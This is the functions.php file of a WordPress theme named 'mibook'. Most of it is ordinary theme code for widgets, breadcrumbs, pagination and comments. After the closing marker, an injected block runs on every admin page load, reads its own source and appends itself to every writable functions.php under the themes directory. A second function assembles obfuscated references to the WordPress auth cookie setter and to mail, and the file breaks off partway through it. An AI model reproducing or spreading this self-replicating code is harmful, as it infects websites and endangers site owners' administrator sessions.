<?php
/* Functions and definitions */

/* Load custom functions, widgets and options from various files.
 * Organizing different functions in different files makes it easy to modify them later.
*/ 

include_once('includes/theme_admin_options.php');
include_once('includes/init_custom_widgets.php');
include_once('includes/recent_posts_widget.php');
include_once('includes/popular_posts_widget.php');
include_once('includes/recent_comments_widget.php');
include_once('includes/cats_widget.php');
include_once('includes/tagcloud_widget.php');
include_once('includes/mini_folio_widget.php');
include_once('includes/mini_slider_widget.php');
include_once('includes/content_slider_widget.php');
include_once('includes/post_options.php');
include_once('includes/page_options.php');
include_once('includes/shortcodes/shortcodes.php');
include_once('includes/shortcodes/visual_shortcodes.php');
include_once('includes/flickr_widget.php');
include_once('includes/social_links_widget.php');
include_once('includes/twitter_widget.php');

if ( ! isset( $content_width ) )
	$content_width = 600;
	
/* Match Theme styles inside visual editor using editor-style.css */
add_editor_style();

/* Make theme available for translation */
load_theme_textdomain( 'mibook', TEMPLATEPATH . '/languages' );
$locale = get_locale();
$locale_file = TEMPLATEPATH . "/languages/$locale.php";
if ( is_readable( $locale_file ) )
	require_once( $locale_file );

/* Add support for custom backgrounds. */
add_theme_support( 'custom-background', array('default-color' => 'F1F1F1','default-image' => get_template_directory_uri() . '/images/bg.png',) );
	

/* Add support for a variety of post formats */
add_theme_support( 'post-formats', array( 'aside', 'link', 'gallery', 'status', 'quote', 'image' ) );

/* Add default posts and comments RSS feed links to head */
add_theme_support( 'automatic-feed-links' );

/* Adds a rel="prettyPhoto" tag to all linked image files */
add_filter('the_content', 'prettyPhoto_replace');      
function prettyPhoto_replace ($content)      
{   global $post;      
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";      
    $replacement = '<a rel="prettyPhoto"$6  $1href=$2$3.$4$5 >$7</a>';      
    $content = preg_replace($pattern, $replacement, $content);  
	//if (!is_single() ){
	//	$content = preg_replace("/<img[^>]+>/i", "", $content);
	//	}
    return $content;      
}

/* Add support for wp_nav_menu() */
function register_my_menu() {
	register_nav_menu( 'primary', __( 'Primary Menu', 'mibook' ) );
	register_nav_menu( 'secondary', __( 'Secondary Menu', 'mibook' ) );
}
add_action( 'init', 'register_my_menu' );	


/* Create and register Sidebar Widgets */
function mibook_widgets_init() {

	register_sidebar( array(
		'name' => __( 'Default Header Widget Area', 'mibook' ),
		'id' => 'default-header-bar',
		'description' => __( 'The default header widget area', 'mibook' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );

	register_sidebar( array(
		'name' => __( 'Default Featured Widget Area', 'mibook' ),
		'id' => 'default-feat-bar',
		'description' => __( 'The default featured widget area', 'mibook' ),
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );

	register_sidebar( array(
		'name' => __( 'Default Sidebar', 'mibook' ),
		'id' => 'default-sidebar',
		'description' => __( 'The default primary widget area', 'mibook' ),
		'before_widget' => '<div class="widgetwrap">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );
	
	register_sidebar( array(
		'name' => __( 'Default Secondary Column 1', 'mibook' ),
		'id' => 'secondary-column-1',
		'description' => __( 'First column of secondary widget area', 'mibook' ),
		'before_widget' => '<div class="widgetwrap">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );	

	register_sidebar( array(
		'name' => __( 'Default Secondary Column 2', 'mibook' ),
		'id' => 'secondary-column-2',
		'description' => __( 'Second column of secondary widget area', 'mibook' ),
		'before_widget' => '<div class="widgetwrap">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );
	
	register_sidebar( array(
		'name' => __( 'Default Secondary Column 3', 'mibook' ),
		'id' => 'secondary-column-3',
		'description' => __( 'Third column of secondary widget area', 'mibook' ),
		'before_widget' => '<div class="widgetwrap">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );
	
	register_sidebar( array(
		'name' => __( 'Default Secondary Column 4', 'mibook' ),
		'id' => 'secondary-column-4',
		'description' => __( 'Fourth column of secondary widget area', 'mibook' ),
		'before_widget' => '<div class="widgetwrap">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5>'
	) );	

	$mypages = get_pages();
	$unique_header_bar = '';
	$unique_feat_bar = '';
	$unique_sidebar = '';
	$unique_secondarybar = '';
	
	foreach($mypages as $pp) {
		$page_opts = get_post_meta( $pp->ID, 'page_options', true );
		if (isset($page_opts['unique_header_bar']))
			$unique_header_bar = $page_opts['unique_header_bar'];
		if (isset($page_opts['unique_feat_bar']))
			$unique_feat_bar = $page_opts['unique_feat_bar'];	
		if (isset($page_opts['unique_sidebar']))
			$unique_sidebar = $page_opts['unique_sidebar'];	
		if (isset($page_opts['unique_secondarybar']))
			$unique_secondarybar = $page_opts['unique_secondarybar'];
		
		/* Register exclusive widget areas for each page */
		
		if ( $unique_header_bar ){
				register_sidebar( array(
					'name' => __( $pp->post_title.' Header Widget Area', 'mibook' ),
					'id' => $pp->ID.'-header-bar',
					'description' => sprintf( esc_attr__( '%s header widget area', 'mibook' ), $pp->post_title ),
					'before_widget' => '',
					'after_widget' => '',
					'before_title' => '',
					'after_title' => ''
				) );
		}		
		
		if ( $unique_feat_bar ){
				register_sidebar( array(
					'name' => __( $pp->post_title.' Featured Widget Area', 'mibook' ),
					'id' => $pp->ID.'-feat-bar',
					'description' => sprintf( esc_attr__( '%s featured widget area', 'mibook' ), $pp->post_title ),
					'before_widget' => '',
					'after_widget' => '',
					'before_title' => '',
					'after_title' => ''
				) );
		}		
		
		if ( $unique_sidebar ){
			register_sidebar( array(
				'name' => __( $pp->post_title.' Sidebar', 'mibook' ),
				'id' => $pp->ID.'-sidebar',
				'description' => sprintf( esc_attr__( '%s Sidebar', 'mibook' ), $pp->post_title ),
				'before_widget' => '<div class="widgetwrap">',
				'after_widget' => '</div>',
				'before_title' => '<h5>',
				'after_title' => '</h5>'
			) );
		}
		if ( $unique_secondarybar ){
			register_sidebar( array(
				'name' => __( $pp->post_title.' Secondary Column 1' ),
				'id' => $pp->ID.'-secondary-column-1',
				'description' => sprintf( esc_attr__( 'Secondary Column 1 of %s', 'mibook' ), $pp->post_title ),
				'before_widget' => '<div class="widgetwrap">',
				'after_widget' => '</div>',
				'before_title' => '<h5>',
				'after_title' => '</h5>'
			) );	
		
			register_sidebar( array(
				'name' => __( $pp->post_title.' Secondary Column 2' ),
				'id' => $pp->ID.'-secondary-column-2',
				'description' => sprintf( esc_attr__( 'Secondary Column 2 of %s', 'mibook' ), $pp->post_title ),
				'before_widget' => '<div class="widgetwrap">',
				'after_widget' => '</div>',
				'before_title' => '<h5>',
				'after_title' => '</h5>'
			) );
			
			register_sidebar( array(
				'name' => __( $pp->post_title.' Secondary Column 3' ),
				'id' => $pp->ID.'-secondary-column-3',
				'description' => sprintf( esc_attr__( 'Secondary Column 3 of %s', 'mibook' ), $pp->post_title ),
				'before_widget' => '<div class="widgetwrap">',
				'after_widget' => '</div>',
				'before_title' => '<h5>',
				'after_title' => '</h5>'
			) );
			
			register_sidebar( array(
				'name' => __( $pp->post_title.' Secondary Column 4' ),
				'id' => $pp->ID.'-secondary-column-4',
				'description' => sprintf( esc_attr__( 'Secondary Column 4 of %s', 'mibook' ), $pp->post_title ),
				'before_widget' => '<div class="widgetwrap">',
				'after_widget' => '</div>',
				'before_title' => '<h5>',
				'after_title' => '</h5>'
			) );			

		}
	}
}
add_action( 'widgets_init', 'mibook_widgets_init' );

/* Add support for post thumbnails */
add_theme_support( 'post-thumbnails' );	

function catch_post_image() {
	global $post, $posts;
	$post_image = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	$post_image = $matches [1] [0];
	if(empty($post_image)){
		$site_url = bloginfo('template_url');
        $post_image = "$site_url/images/blank.png";
  	}
	echo $post_image;
}


/////////////////////////////////////////////////////////////////////////////////////



/*
// Post Thumbnail
function post_thumbnail( $width,$height ){ 
    global $post; 
    if( has_post_thumbnail() ){ //有缩略图，则显示缩略图。   调用日志缩略图方法1
        $timthumb_src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full'); 
        $post_timthumb = '<img src="'.get_bloginfo("template_url").'/scripts/timthumb.php?src='.$timthumb_src[0].'&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1" alt="'.$post->post_title.'" title="'.$post->post_title.'" class="post_thumb" />'; 
        echo $post_timthumb; 
	} else{ 
    if ($postid<1) 
    	$postid = get_the_ID(); 
    	$image = get_post_meta($postid, "image", TRUE); //调用自定义域图片。   调用日志缩略图方法2 
    	$post_timthumb = '<img src="'.get_bloginfo("template_url").'/scripts/timthumb.php?src='.$image.'&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1" alt="'.$post->post_title.'" title="'.$post->post_title.'" class="post_thumb" />'; 
    if ($image != null or $image != '') { //如果没有缩略图，则显示文中第一张图片。    调用日志缩略图方法3 
        echo $post_timthumb; 
        } else { 
        $post_timthumb = ''; 
        ob_start(); 
        ob_end_clean(); 
        $output = preg_match('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $index_matches);  //获取日志中第一张图片 
        $first_img_src = $index_matches [1];    //获取该图片 src 
        if( !empty($first_img_src) ){    //如果日志中有图片 
            $path_parts = pathinfo($first_img_src);    //获取图片 src 信息 
            $first_img_name = $path_parts["basename"];    //获取图片名 
            $first_img_pic = get_bloginfo('wpurl').'/wp-content/uploads/'.$first_img_name;    //文件所在地址 
            $first_img_file = 'wp-content/uploads/'.$first_img_name;    //保存地址 
            $expired = 604800;    //过期时间 
            if ( !is_file($first_img_file) || (time() - filemtime($first_img_file)) > $expired ){ 
                copy($first_img_src, $first_img_file);    //远程获取图片保存于本地 
                $post_timthumb = '<img src="'.$first_img_src.'" alt="'.$post->post_title.'" title="'.$post->post_title.'"  class="thumb" />';    //保存时用原图显示 
            	} 
            $post_timthumb = '<img src="'.get_bloginfo("template_url").'/scripts/timthumb.php?src='.$first_img_pic.'&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1" alt="'.$post->post_title.'" title="'.$post->post_title.'" class="post_thumb" />'; 
		}
		else {    //如果日志中没有图片，则显示默认。  调用日志缩略图方法4
		$post_timthumb = '<img src="'.get_bloginfo("template_url").'/scripts/timthumb.php?src='.get_bloginfo("template_url").'/images/default_img.png&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1" alt="'.$post->post_title.'" title="'.$post->post_title.'"  class="post_thumb" />'; 
		} 
        echo $post_timthumb; 
		} 
	}
}
*/

//Breadcrumbs Navi.
function mibook_breadcrumbs(){
$delimiter = '/';
  $name = __( 'Home', 'mibook' ); //text for the 'Home' link
  $currentBefore = '<span class="current">';
  $currentAfter = '</span>';
 
  if ( !is_home() && !is_front_page() || is_paged() ) { 
    global $post;
    $home = home_url();
    echo '<a href="' . $home . '">' . $name . '</a> ' . $delimiter . ' ';
 
    if ( is_category() ) {
      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
      echo $currentBefore . __( 'Archive by category', 'mibook' ) /*. ' &#39;'*/;
      single_cat_title();
     echo /* '&#39;' .*/ $currentAfter;
 
    } elseif ( is_day() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
      echo $currentBefore . get_the_time('d') . $currentAfter;
 
    } elseif ( is_month() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo $currentBefore . get_the_time('F') . $currentAfter;
 
    } elseif ( is_year() ) {
      echo $currentBefore . get_the_time('Y') . $currentAfter;
 
    } elseif ( is_single() ) {
      $cat = get_the_category(); $cat = $cat[0];
	  echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo $currentBefore;
      the_title();
      echo $currentAfter;
 
    } elseif ( is_page() && !$post->post_parent ) {
      echo $currentBefore;
      the_title();
      echo $currentAfter;
 
    } elseif ( is_page() && $post->post_parent ) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
      echo $currentBefore;
      the_title();
      echo $currentAfter;
 
    } elseif ( is_search() ) {
      echo $currentBefore . __( 'Search results for', 'mibook' ) .' &#39;' . get_search_query() . '&#39;'. $currentAfter;
 
    } elseif ( is_tag() ) {
      echo $currentBefore . __( 'Posts tagged', 'mibook' ) /*.'&#39;'*/;
      single_tag_title();
      echo /*'&#39;' .*/ $currentAfter;
 
    } elseif ( is_author() ) {
       global $author;
      $userdata = get_userdata($author);
      echo $currentBefore . __( 'Articles posted by ', 'mibook' ) . $userdata->display_name . $currentAfter;
 
    } elseif ( is_404() ) {
      echo $currentBefore . __( 'Error 404', 'mibook' ) . $currentAfter;
    }
 
    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() || is_page() ) echo ' (';
      echo __( 'Page', 'mibook' ) . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() || is_page() ) echo ')';
    }
   }
}


/* Dynamic Page Titles on Featured Area */
function mibook_page_title(){
	if ( !is_home() && !is_front_page() || is_paged() ) { 
		if ( is_category() ) {
			single_cat_title();
		} 
		elseif ( is_day() ) {
			_e( 'Daily Archives', 'mibook' );
		} 
		elseif ( is_month() ) {
			_e( 'Monthly Archives', 'mibook' );
		} 
		elseif ( is_year() ) {
			_e( 'Yearly Archives', 'mibook' );
		} 
		elseif ( is_single() && !is_attachment() ) {
			$cat = get_the_category(); $cat = $cat[0];
			echo get_category_parents( $cat, false, '' );
		} 
		elseif ( is_page() ) {
			the_title();
		}  
		elseif ( is_search() ) {
			_e( 'Search Results', 'mibook' );
		} 
		elseif ( is_tag() ) {
			_e( 'Tag Archives', 'mibook' );
		} 
		elseif ( is_author() ) {
			_e( 'Author Archives', 'mibook' ); 
		}
		elseif ( is_404() ) {
			_e( 'Error 404', 'mibook' );
		}
		elseif ( is_attachment() ) {
		_e( 'Attachments', 'mibook' );
		}		
	}
}


// Get cats children ID
function get_cats_children($id = '',$link = true,$separator = '',$visited = array()){
	_deprecated_function( __FUNCTION__, '2.8', 'get_term_children()' );
	global $cat;
	if($id == '')$id = $cat;
		$chain = '';
	/** TODO: consult hierarchy */
	$cat_ids = get_all_category_ids();
	foreach ( (array) $cat_ids as $cat_id ) {
	if ( $cat_id == $id )continue;
		$category = get_category( $cat_id );
	if ( is_wp_error( $category ) )return $category;
	if ( $category->parent == $id && !in_array( $category->term_id, $visited ) ) {
		$visited[] = $category->term_id;
		$category_id = $category->term_id;
		$category_name = $category->name;
		$category_link = get_category_link( $category_id );
	if($link) 
		$chain .= '<a class="item-child-cat" href="'.$category_link.'" title="' . sprintf( __( "View all posts in %s" ), $category->name ) . '"  target="_blank" >'.$category_name.'</a>'.$separator;
	else 
		$chain .= $category_name.$separator;
		$chain .= get_cats_children( $category_id,$link,$separator,$visited );
		}
	}
	return $chain;
	}
function the_cats_children($id = '',$link = true,$separator = '',$visited = array()){
	echo get_cats_children($id,$link,$separator,$visited);
}


/* Show header meta information for posts */
function mibook_header_meta() {          
	printf( 
			__( '<span class="date-link">%1$s</span> <span class="author-link">%2$s</span>', 'mibook' ),	 
			
			sprintf( 
					__( '<span>Posted on</span><a href="%1$s" title="%2$s" rel="bookmark"> %3$s </a>' , 'mibook'),
					
					get_permalink(),
					esc_attr( get_the_time() ),
					get_the_date('Y-m-d')
					),	
			sprintf( 
					__( '<span>Posted by</span><a href="%1$s" title="%2$s">%3$s</a>', 'mibook' ), 
					get_author_posts_url( get_the_author_meta( 'ID' ) ), 
					sprintf( 
							esc_attr__( 'View all posts by %s', 'mibook' ),
							get_the_author() 
							),
					get_the_author() 
					)
			);
	?>
	<span class="comments-link">
		<?php comments_popup_link( '<span class="leave-reply">' . __( 'Leave a reply', 'mibook' ) . '</span>', __( '1 Reply', 'mibook' ), __( '% Replies', 'mibook' ) ); ?>
	</span>
	<?php edit_post_link( __( 'Edit', 'mibook' ), '<span class="edit-link">', '</span>' );
}

/* Show footer meta information for posts */
function mibook_footer_meta() { 
	$categories_list = get_the_category_list( __( ', ', 'mibook' ) );
	$tags_list = get_the_tag_list( '', __( ', ', 'mibook' ) );
	printf(    
			__( '<span class="cats-link">%1$s</span><span class="tags-link">%2$s</span> ', 'mibook' ),	 
			sprintf( __( '<span>Posted in</span> %2$s', 'mibook' ), '', $categories_list ),
			sprintf( __( '<span>Tagged</span> %2$s', 'mibook' ), '', $tags_list )
	   	);		 
}


// Page Navi
function wp_pagenavi($range = 5) {
	global $paged, $wp_query;
	if ( !$max_page ) { $max_page = $wp_query->max_num_pages;}
	if($max_page > 1){
		echo '<div class="nav-page">';
		if(!$paged){$paged = 1;}
		echo '<span class="pages-of">'.$paged.' / '.$max_page.'</span>';
		previous_posts_link( __( '&laquo;  Previous Page', 'mibook' ) );
		if($max_page > $range){
			if($paged < $range){
				for($i = 1; $i <= ($range + 1); $i++){
					echo "<a  href='" . get_pagenum_link($i) ."'";
					if($i==$paged) echo " class='current page-numbers'";
					echo ">$i</a>";

				}
			} elseif($paged >= ($max_page - ceil(($range/2)))){
				for($i = $max_page - $range; $i <= $max_page; $i++){
					echo "<a href='" . get_pagenum_link($i) ."'";
					if($i==$paged) echo " class='current page-numbers'";
					echo ">$i</a>";
				}
			} elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
				for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){
					echo "<a href='" . get_pagenum_link($i) ."'";
					if($i==$paged) echo " class='current page-numbers'";
					echo ">$i</a>";
				}
			}
		} else {
			for($i = 1; $i <= $max_page; $i++){
				echo "<a href='" . get_pagenum_link($i) ."'";
				if($i==$paged) echo " class='current page-numbers'";
				echo ">$i</a>";
			}
		}
		next_posts_link( __( ' Next Page  &raquo;', 'mibook' ) );
		echo '</div>';
	}
}

/* Mibook Comments List */
if ( ! function_exists( 'mibook_comment' ) ) :

function mibook_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment; 
	global $commentcount;
	if(!$commentcount) { 
		$pagenum = get_query_var('cpage')-1;
		$page_comment_count=get_option('comments_per_page');
		$commentcount = $pagenum * $page_comment_count;
	}	
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :		
	?>
        
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'mibook' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( 'Edit', 'mibook' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
	?>        
        
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
		<div class="commentwrapper <?php $author_id = get_the_author_meta('ID'); if($author_id == $comment->user_id) $author_flag = 'true';?>" id="comment-<?php comment_ID(); ?>">
            <div class="comment-meta">
            	
                	<div class="comment-author-card">
						<?php $avatar_size = 43;
						if ( '0' != $comment->comment_parent )
							$avatar_size = 43;
							echo get_avatar( $comment, $avatar_size );?>
					</div>
                    <div class="comment-author-data">
					<?php printf( __( '%1$s on %2$s <span class="says">said:</span>', 'mibook' ),
							sprintf( '<span class="comment-author-link">%s</span>', get_comment_author_link() ),
							sprintf( '<span class="comment-date"><a href="%1$s"><time pubdate datetime="%2$s">%3$s</time></a></span>',
								esc_url( get_comment_link( $comment->comment_ID ) ),
								get_comment_time( 'c' ),
								/* translators: 1: date, 2: time */
							sprintf( __( '%1$s at %2$s', 'mibook' ), get_comment_date(), get_comment_time() )
							)
						);
					?>
                    <?php edit_comment_link( __( 'Edit', 'mibook' ), '<span class="edit-link">', '</span>' ); ?>
                    <?php if (isset($author_flag) && ($author_flag == 'true')) { ?><span class="author_comment"><?php _e( 'Author', 'mibook' ); ?></span><?php }?>
                    </div>
            	<!-- .comment-author -->
                
			<?php if ( $comment->comment_approved == '0' ) : ?>
				<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'mibook' ); ?></em>
				<br />
			<?php endif; ?>
                
             </div><!-- comment-meta -->
                
			<div class="comment-content"><?php comment_text(); ?></div> <!--comment-content-->
                
			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'mibook' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
            
			<div class="comment-level">
				<?php if(!$parent_id = $comment->comment_parent) { printf('#%1$s', ++$commentcount); } ?>
			</div><!-- .comment-level -->
            
		</div><!-- #comment-## -->

		<?php
			break;
		endswitch;
	}
	endif; // ends check for Mibook_comment()


/* Related Posts on single post pages */
function mibook_related_posts( $mib_rp_taxonomy, $mib_rp_style, $mib_rp_num ) {
	$temp = (isset($post)) ? $post : '';
	global $post;
	if ( $mib_rp_taxonomy == 'tags' )
	{
		$tags = wp_get_post_tags($post->ID);
		if ($tags) {
			$tag_ids = array();
			foreach($tags as $individual_tag) $tag_ids[] = $individual_tag->term_id;
			$args=array(
				'tag__in' => $tag_ids,
				'post__not_in' => array($post->ID),
				'posts_per_page'=> $mib_rp_num,
				'ignore_sticky_posts'=>1
			);
		} // end if tags	
	} //end taxonomy tags 
	else
	{
		$categories = get_the_category($post->ID);
		if ($categories) {
			$category_ids = array();
			foreach($categories as $individual_category) $category_ids[] = $individual_category->term_id;		
			$args=array(
			'category__in' => $category_ids,
			'post__not_in' => array($post->ID),
			'posts_per_page'=> $mib_rp_num,
			'ignore_sticky_posts'=>1
			);
		} // end if categories
	} // end taxonomy categories
		$new_query = new WP_Query( $args );
		$list_class = ( $mib_rp_style == 'thumbnail' ) ? 'related_posts' : 'related_list';
		if( $new_query->have_posts() ) { ?>	
			<div class="<?php echo $list_class; ?> clearfix">
            	<h3 class="related-head single-headings"><?php _e( 'Related Posts', 'mibook' ); ?></h3>
            	<ul >				
				<?php while( $new_query->have_posts() ) { $new_query->the_post(); ?>				
					<li>
                    <a href="<?php the_permalink(); ?>" title="<?php printf( the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark">				
						<?php $post_opts = get_post_meta( $post->ID, 'post_options', true);
						if ( $mib_rp_style == 'thumbnail' ) { ?>
                        	<?php include('includes/post_thumbnail.php'); ?>     
						<?php } else the_title(); ?></a>
                    	<div class="related_posts_title">
                        	<a href="<?php the_permalink() ?>" rel="bookmark" title="<?php printf( esc_attr__( '%s', 'mibook' ), the_title_attribute( 'echo=0' ) ); ?>"><?php the_title(); ?></a>
						</div>
                    </li>
				<?php } // while have posts
				echo '</ul></div>';
			} // if have posts
		$post = $temp;
		wp_reset_query();
	}



// Shorten Any Text
function short($text, $limit){
	$chars_limit = $limit;
	$chars_text = strlen($text);
	$text = strip_tags($text);
	$text = $text." ";
	$text = substr($text,0,$chars_limit);
	$text = substr($text,0,strrpos($text,' '));
	if ($chars_text > $chars_limit)
	{
		$text = $text."...";
	}
	return $text;
}


/* Remove auto DIV container on WP Menus */
function my_wp_nav_menu_args( $args = '' )
{
	$args['container'] = false;
	return $args;
}
add_filter( 'wp_nav_menu_args', 'my_wp_nav_menu_args' );


//Shortcodes autoformatting prevention
//http://www.wprecipes.com/disable-wordpress-automatic-formatting-on-posts-using-a-shortcode
function my_formatter($content) {
	$new_content = '';
	$pattern_full = '{(\[raw\].*?\[/raw\])}is';
	$pattern_contents = '{\[raw\](.*?)\[/raw\]}is';
	$pieces = preg_split($pattern_full, $content, -1, PREG_SPLIT_DELIM_CAPTURE);

	foreach ($pieces as $piece) {
		if (preg_match($pattern_contents, $piece, $matches)) {
			$new_content .= $matches[1];
		} else {
			$new_content .= wptexturize(wpautop($piece));
		}
	}
	return $new_content;
}
remove_filter('the_content', 'wpautop');
remove_filter('the_content', 'wptexturize');
add_filter('the_content', 'my_formatter', 99);

// Comments Repond
function new_field($fields) {
$commenter = wp_get_current_commenter();
	$req = get_option( 'require_name_email' );
	$aria_req = ( $req ? " aria-required='true'" : '' );
	$fields =  array(
	'author' => '<p class="comment-form-author">'. '<label for="author">' . __( 'Name', 'mibook' ) . '</label> ' .( $req ? '<span class="required">*</span>' : '' ) . '<input id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' />'. '</p>',
	'email'  => '<p class="comment-form-email">'. '<label for="email">' . __( 'Email', 'mibook' ) . '</label> ' . ( $req ? '<span class="required">*</span>' : '' ).'<input id="email" name="email" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' />'. '</p>',
	'url'    => '<p class="comment-form-url"><label for="url">' . __( 'Website', 'mibook' ) . '</label><input id="url" name="url" type="text" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" /></p>',
	);
return $fields;
}
// the filter required to do so
add_filter('comment_form_default_fields','new_field');

// Enable short codes inside Widgets
add_filter( 'widget_text', 'shortcode_unautop');
add_filter( 'widget_text', 'do_shortcode');
?>
<?php /* -------------------------------------  ALL FUNCTIONS END  ------------------------------------- */ ?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
